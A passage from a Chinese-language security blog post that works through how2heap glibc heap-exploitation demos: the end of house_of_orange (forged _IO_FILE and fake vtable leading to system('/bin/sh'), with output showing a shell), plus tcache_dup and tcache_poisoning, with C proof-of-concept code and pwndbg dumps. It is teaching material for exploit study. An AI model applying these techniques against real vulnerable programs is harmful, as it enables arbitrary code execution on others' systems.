*/</span><br><span class="line"> </span><br><span class="line">    top[3] = io_list_all - 0x10;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">      At the end, the system function will be invoked with the pointer to this file pointer.</span><br><span class="line">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    memcpy( ( char *) top, &quot;/bin/sh\x00&quot;, 8);</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span><br><span class="line">      in _IO_list_all.</span><br><span class="line">      Since we can only overwrite this address with main_arena&apos;s unsorted-bin-list,</span><br><span class="line">      the idea is to get control over the memory at the corresponding fd-ptr.</span><br><span class="line">      The address of the next file pointer is located at base_address+0x68.</span><br><span class="line">      This corresponds to smallbin-4, which holds all the smallbins of</span><br><span class="line">      sizes between 90 and 98. For further information about the libc&apos;s bin organisation</span><br><span class="line">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span><br><span class="line"></span><br><span class="line">      Since we overflow the old top chunk, we also control it&apos;s size field.</span><br><span class="line">      Here it gets a little bit tricky, currently the old top chunk is in the</span><br><span class="line">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span><br><span class="line">      in this list first, therefore, iterates over the list.</span><br><span class="line">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span><br><span class="line">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span><br><span class="line">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span><br><span class="line">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span><br><span class="line">      therefore, occupying the smallbin[4] location in the main_arena and</span><br><span class="line">      eventually representing the fake file pointer&apos;s fd-ptr.</span><br><span class="line"></span><br><span class="line">      In addition to sorting, malloc will also perform certain size checks on them,</span><br><span class="line">      so after sorting the old top chunk and following the bogus fd pointer</span><br><span class="line">      to _IO_list_all, it will check the corresponding size field, detect</span><br><span class="line">      that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span><br><span class="line">      and finally triggering the abort call that gets our chain rolling.</span><br><span class="line">      Here is the corresponding code in the libc:</span><br><span class="line">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    top[1] = 0x61;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">      Now comes the part where we satisfy the constraints on the fake file pointer</span><br><span class="line">      required by the function _IO_flush_all_lockp and tested here:</span><br><span class="line">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span><br><span class="line"></span><br><span class="line">      We want to satisfy the first condition:</span><br><span class="line">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    _IO_FILE *fp = (_IO_FILE *) top;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = 0; // top+0xc0</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = (char *) 2; // top+0x20</span><br><span class="line">    fp-&gt;_IO_write_ptr = (char *) 3; // top+0x28</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">      4) Finally set the jump table to controlled memory and place system there.</span><br><span class="line">      The jump table pointer is right after the _IO_FILE struct:</span><br><span class="line">      base_address+sizeof(_IO_FILE) = jump_table</span><br><span class="line">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    size_t *jump_table = &amp;top[12]; // controlled memory</span><br><span class="line">    jump_table[3] = (size_t) &amp;winner;</span><br><span class="line">    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8</span><br><span class="line"></span><br><span class="line">    /* Finally, trigger the whole chain by calling malloc */</span><br><span class="line">    malloc(10);</span><br><span class="line">   /*</span><br><span class="line">     The libc&apos;s error message will be printed to the screen</span><br><span class="line">     But you&apos;ll get a shell anyways.</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int winner(char *ptr)</span><br><span class="line">&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">The attack vector of this technique was removed by changing the behavior of malloc_printerr, which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).</span><br><span class="line">Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51</span><br><span class="line">*** Error in `./house_of_orange&apos;: malloc(): memory corruption: 0x00007ff3e09aa520 ***</span><br><span class="line">======= Backtrace: =========</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7ff3e065c7e5]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7ff3e066713e]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7ff3e0669184]</span><br><span class="line">./house_of_orange[0x400788]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7ff3e0605830]</span><br><span class="line">./house_of_orange[0x400589]</span><br><span class="line">======= Memory map: ========</span><br><span class="line">00400000-00401000 r-xp 00000000 08:01 790743                             /home/qianfa/Desktop/how2heap/glibc_2.25/house_of_orange</span><br><span class="line">00600000-00601000 r--p 00000000 08:01 790743                             /home/qianfa/Desktop/how2heap/glibc_2.25/house_of_orange</span><br><span class="line">00601000-00602000 rw-p 00001000 08:01 790743                             /home/qianfa/Desktop/how2heap/glibc_2.25/house_of_orange</span><br><span class="line">01843000-01886000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">7ff3dc000000-7ff3dc021000 rw-p 00000000 00:00 0 </span><br><span class="line">7ff3dc021000-7ff3e0000000 ---p 00000000 00:00 0 </span><br><span class="line">7ff3e03cf000-7ff3e03e5000 r-xp 00000000 08:01 661021                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7ff3e03e5000-7ff3e05e4000 ---p 00016000 08:01 661021                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7ff3e05e4000-7ff3e05e5000 rw-p 00015000 08:01 661021                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7ff3e05e5000-7ff3e07a5000 r-xp 00000000 08:01 660875                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ff3e07a5000-7ff3e09a5000 ---p 001c0000 08:01 660875                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ff3e09a5000-7ff3e09a9000 r--p 001c0000 08:01 660875                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ff3e09a9000-7ff3e09ab000 rw-p 001c4000 08:01 660875                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ff3e09ab000-7ff3e09af000 rw-p 00000000 00:00 0 </span><br><span class="line">7ff3e09af000-7ff3e09d5000 r-xp 00000000 08:01 660868                     /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7ff3e0bb6000-7ff3e0bb9000 rw-p 00000000 00:00 0 </span><br><span class="line">7ff3e0bd3000-7ff3e0bd4000 rw-p 00000000 00:00 0 </span><br><span class="line">7ff3e0bd4000-7ff3e0bd5000 r--p 00025000 08:01 660868                     /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7ff3e0bd5000-7ff3e0bd6000 rw-p 00026000 08:01 660868                     /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7ff3e0bd6000-7ff3e0bd7000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffc6bc42000-7ffc6bc63000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">7ffc6bddd000-7ffc6bde0000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffc6bde0000-7ffc6bde2000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br><span class="line">$ id</span><br><span class="line">uid=1000(qianfa) gid=1000(qianfa) groups=1000(qianfa),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span><br></pre></td></tr></table></figure>
<p><strong>可以结合 安恒10月赛</strong></p>
<p>整个堆都属于 top chunk，每次申请内存时，就从 top chunk 中划出请求大小的堆块返回给用户，于是 top chunk 就越来越小。当某一次 top chunk 的剩余大小已经不能够满足请求时，就会调用函数 sysmalloc() 分配新top chunk，这时可能会发生两种情况，一种是直接扩充 top chunk，另一种是调用 mmap 分配一块新的 top chunk。具体调用哪一种方法是由申请大小决定的，为了能够使用前一种扩展 top chunk，需要请求小于阀值 mp_.mmap_threshold。如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap()分配的内存块小于设定的最大值，将使用 mmap()系统调用直接向操作系统申请内存。</p>
<p>分析:</p>
<p>该方法的利用，需要heap能够溢出，并覆盖Top chunk的size字段</p>
<ul>
<li>定义变量</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char *p1, *p2;</span><br><span class="line">size_t io_list_all, *top;</span><br></pre></td></tr></table></figure>
<ul>
<li>申请一个0x400大小的chunk</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1 = malloc(0x400-16);</span><br></pre></td></tr></table></figure>
<ul>
<li>修改Top chunk的size，需要满足条件如下：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1) Top chunk + size has to be page aligned</span><br><span class="line">Top chunk + size 必须对其到4k，也就是0x1000的整数倍</span><br><span class="line">2) Top chunk&apos;s prev_inuse bit has to be set.</span><br><span class="line">Top chunk的prev_inuse必须设为1</span><br><span class="line">3) size要大于MINSIZE(0x10)</span><br><span class="line">4) size要小于之后申请的chunk size + MINSIZE(0x10)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">top = (size_t *) ( (char *) p1 + 0x400 - 16);</span><br><span class="line">top[1] = 0xc01;    // 0xc00 + 0x400 = 0x1000</span><br></pre></td></tr></table></figure>
<ul>
<li>申请0x1000大小的chunk</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p2 = malloc(0x1000);</span><br></pre></td></tr></table></figure>
<p>当前堆的情况:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4gx 0x602000                               ----&gt; p1</span><br><span class="line">0x602000:	0x0000000000000000	0x0000000000000401</span><br><span class="line">0x602010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; x/4gx 0x602400                               -----&gt; old top_chunk</span><br><span class="line">0x602400:	0x0000000000000000	0x0000000000000be1   -----&gt; 0x602400+0xbe0=0x602fe0</span><br><span class="line">0x602410:	0x00007ffff7dd1b78	0x00007ffff7dd1b78   -----&gt; 0x602fe0 + 0x20 = 0x603000</span><br><span class="line">pwndbg&gt; x/4gx 0x602fe0               ----&gt; old top_chunk缩小0x20,用于保存fencepost chunk</span><br><span class="line">0x602fe0:	0x0000000000000be0	0x0000000000000010</span><br><span class="line">0x602ff0:	0x0000000000000000	0x0000000000000011</span><br><span class="line">pwndbg&gt; x/4gx 0x603000</span><br><span class="line">0x603000:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; x/4xg 0x623000                               ------&gt; p2</span><br><span class="line">0x623000:	0x0000000000000000	0x0000000000001011</span><br><span class="line">0x623010:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>p2被分配在新的页中，也就是<code>0x603000 + 0x21000 = 0x623000</code>中。</p>
<p>这时候，top chunk将被分配到unsorted bin中。</p>
<p>未完待续!!!</p>
<h1 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h1><p>glibc2.26版本中新加了一种名叫tcache(thread local caching)的缓存机制。</p>
<p>它被集成到了libc2.26中，它对每个线程增加一个bin缓存，这样能显著地提高性能，默认情况下，每个线程有64个bins，以16(8)递增，mensize从24(12)到1032(516)。</p>
<p><strong>chunk进入tcache的情形</strong></p>
<ol>
<li><p>释放时，_int_free中在检查了size合法后，放入fastbin之前，它先尝试将其放入tcache</p>
</li>
<li><p>在_int_malloc中，若fastbins中取出块则将对应bin中其余chunk填入tcache对应项直到填满（smallbins中也是如此）：</p>
</li>
<li>当进入unsorted bin(同时发生堆块合并）中找到精确的大小时，并不是直接返回而是先加入tcache中，直到填满：</li>
</ol>
<p><strong>从tcache获取chunk的情形</strong></p>
<ol>
<li><p>在__libc_malloc，_int_malloc之前，如果tcache中存在满足申请需求大小的块，就从对应的tcache中返回chunk</p>
</li>
<li><p>在遍历完unsorted bin(同时发生堆块合并）之后，若是tcache中有对应大小chunk则取出并返回：</p>
</li>
</ol>
<p>由上可知malloc会优先考虑tcache，在使用它之前只有size等很少的完整性校验(只有存入前有size &gt;= MINSIZE &amp;&amp; aligned_OK (size) &amp;&amp; !misaligned_chunk (p) &amp;&amp; (uintptr_t) p &lt;= (uintptr_t) -size)，而它本身并没有什么完整性校验，于是利用它进行攻击会简单很多。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, &quot;This file demonstrates a simple double-free attack with tcache.\n&quot;);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Allocating buffer.\n&quot;);</span><br><span class="line">	int *a = malloc(8);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;malloc(8): %p\n&quot;, a);</span><br><span class="line">	fprintf(stderr, &quot;Freeing twice...\n&quot;);</span><br><span class="line">	free(a);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Now the free list has [ %p, %p ].\n&quot;, a, a);</span><br><span class="line">	fprintf(stderr, &quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;, malloc(8), malloc(8));</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>申请chunk a</p>
</li>
<li><p>连续释放两次</p>
</li>
<li>tcache free list中</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x20 [  2]: 0x602260 ◂— 0x602260 /* &apos;`&quot;`&apos; */</span><br></pre></td></tr></table></figure>
<p>从而可以连续申请两次。</p>
<h1 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, &quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span><br><span class="line">	       &quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span><br><span class="line">	       &quot;The attack is very similar to fastbin corruption attack.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">	size_t stack_var;</span><br><span class="line">	fprintf(stderr, &quot;The address we want malloc() to return is %p.\n&quot;, (char *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Allocating 1 buffer.\n&quot;);</span><br><span class="line">	intptr_t *a = malloc(128);</span><br><span class="line">	fprintf(stderr, &quot;malloc(128): %p\n&quot;, a);</span><br><span class="line">	fprintf(stderr, &quot;Freeing the buffer...\n&quot;);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Now the tcache list has [ %p ].\n&quot;, a);</span><br><span class="line">	fprintf(stderr, &quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span><br><span class="line">		&quot;to point to the location to control (%p).\n&quot;, sizeof(intptr_t), a, &amp;stack_var);</span><br><span class="line">	a[0] = (intptr_t)&amp;stack_var;</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;1st malloc(128): %p\n&quot;, malloc(128));</span><br><span class="line">	fprintf(stderr, &quot;Now the tcache list has [ %p ].\n&quot;, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	intptr_t *b = malloc(128);</span><br><span class="line">	fprintf(stderr, &quot;2st malloc(128): %p\n&quot;, b);</span><br><span class="line">	fprintf(stderr, &quot;We got the control\n&quot;);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>首先申请一个chunk a</p>
</li>
<li><p>释放a</p>
</li>
<li>修改a[0]</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line">0x90 [  1]: 0x602260 —▸ 0x7fffffffddf0 —▸ 0x400840 (__libc_csu_init) ◂— push   r15</span><br><span class="line">pwndbg&gt; p &amp;stack_var</span><br><span class="line">$4 = (size_t *) 0x7fffffffddf0</span><br></pre></td></tr></table></figure>
<ul>
<li>连续申请两次，即可将stack_var申请出来</li>
</ul>

    </article>
    <!-- license  -->
    
        <div class="license-wrapper">
            <p>原文作者: <a href="https://www.tiandiwuji.top">Tianji</a>
            </p><p>原文链接: <a href="https://www.tiandiwuji.top/posts/41139/">https://www.tiandiwuji.top/posts/41139/</a>
            </p><p>发表日期: <a href="https://www.tiandiwuji.top/posts/41139/">August 6th 2018, 11:33:01 pm</a>
            </p><p>版权声明: 本文采用<a rel="external nofollow" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator  -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href="/posts/42614/" title="TokyoWesterns" ctf="">
                    <div class="nextTitle">TokyoWesterns CTF</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href="/posts/27029/" title="0ctf2018-babyheap">
                    <div class="prevTitle">0ctf2018-babyheap</div>
                </a>
            
        </li>
    </ul>
    <!-- 评论插件 -->
    <!-- 来必力City版安装代码 -->

    <div id="lv-container" data-id="city" data-uid="MTAyMC8zODcyNS8xNTI1Mw==">
        <script type="text/javascript">
            (function (d, s) {
                var j, e = d.getElementsByTagName(s)[0];
                if (typeof LivereTower === 'function') { return; }
                j = d.createElement(s);
                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
                j.async = true;

                e.parentNode.insertBefore(j, e);
            })(document, 'script');
        </script>
        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
    </div>

<!-- City版安装代码已完成 -->
    
    
    <!--PC和WAP自适应版-->

    <!--PC版-->


    
    

    <!-- 评论 -->
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="mailto:fengyunhetao@gmail.com" class="iconfont-archer email" title="email" rel="external nofollow" target="_blank"></a>
            
        
    
        
            
                <a href="//github.com/fengyuhetao" class="iconfont-archer github" target="_blank" title="github"></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    

    </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="external nofollow">Archer</a></span>
    </div>
    <!-- 不蒜子  -->
    
    <div class="busuanzi-container">
    
     
    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
    
    </div>
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper" style="top:50vh;">
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#内存分配概述"><span class="toc-number">2.</span> <span class="toc-text">内存分配概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#内存回收概述"><span class="toc-number">3.</span> <span class="toc-text">内存回收概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#first-fit"><span class="toc-number">4.</span> <span class="toc-text">first_fit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fastbin-dup"><span class="toc-number">5.</span> <span class="toc-text">fastbin_dup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fastbin-dup-into-stack"><span class="toc-number">6.</span> <span class="toc-text">fastbin_dup_into_stack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fastbin-dup-consolidate"><span class="toc-number">7.</span> <span class="toc-text">fastbin_dup_consolidate</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#unsafe-unlink"><span class="toc-number">8.</span> <span class="toc-text">unsafe_unlink</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-spirit"><span class="toc-number">9.</span> <span class="toc-text">house_of_spirit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#poison-null-byte"><span class="toc-number">10.</span> <span class="toc-text">poison_null_byte</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#overlapping-chunks"><span class="toc-number">11.</span> <span class="toc-text">overlapping_chunks</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#overlapping-chunks-2"><span class="toc-number">12.</span> <span class="toc-text">overlapping_chunks_2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-lore"><span class="toc-number">13.</span> <span class="toc-text">house_of_lore</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-force"><span class="toc-number">14.</span> <span class="toc-text">house_of_force</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#unsorted-bin-attack"><span class="toc-number">15.</span> <span class="toc-text">unsorted_bin_attack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#unsorted-bin-into-stack"><span class="toc-number">16.</span> <span class="toc-text">unsorted_bin_into_stack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-einherjar"><span class="toc-number">17.</span> <span class="toc-text">house_of_einherjar</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-orange"><span class="toc-number">18.</span> <span class="toc-text">house_of_orange</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#tcache-dup"><span class="toc-number">19.</span> <span class="toc-text">tcache_dup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#tcache-poisoning"><span class="toc-number">20.</span> <span class="toc-text">tcache_poisoning</span></a></li></ol>
    </div>
    
    <div class="back-top iconfont-archer">&#xe639;</div>
    <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
          <div class="sidebar-panel-archives">
    <!-- 在ejs中将archive按照时间排序 -->
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
